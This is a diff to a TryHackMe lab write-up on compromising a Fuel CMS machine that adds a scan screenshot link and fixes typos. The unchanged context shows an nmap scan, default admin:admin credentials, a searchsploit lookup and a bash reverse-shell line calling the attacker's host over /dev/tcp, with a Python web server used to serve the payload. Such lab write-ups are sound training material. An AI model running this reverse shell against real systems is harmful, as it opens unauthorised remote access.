@@ -10,6 +10,9 @@ We use `nmap` to scan the target :
 nmap -sT -sV 10.10.128.117
 ```
 
+![nmap](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/e5d5b0ce-157d-4e87-adc3-43d5247f578d)
+
+
 opening the browser on machine IP will show some information :
 
 ![firstPage](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/c8c00347-73c8-4ef9-926d-d29fa78eef2b)
@@ -20,7 +23,7 @@ with some extra information showing the location of config files :
 
 as it is obvious the username and password for logging in is `admin:admin`
 
-in the CMS itself there is no way to upload a file (at least i tried verious extensions) but none of the worked.
+in the CMS itself there is no way to upload a file (at least i tried verious extensions) but none of them worked.
 
 i decided to search for `fuel cms` exploit wtih `searchsploit` :
 
@@ -88,7 +91,7 @@ bash -i >& /dev/tcp/10.6.74.10/4444 0>&1
 use python to make the file downloadable for the target :
 
 ```python
-pythn3 -m http.server 8080
+python3 -m http.server 8080
 ```
 
 and get the file from the victim :
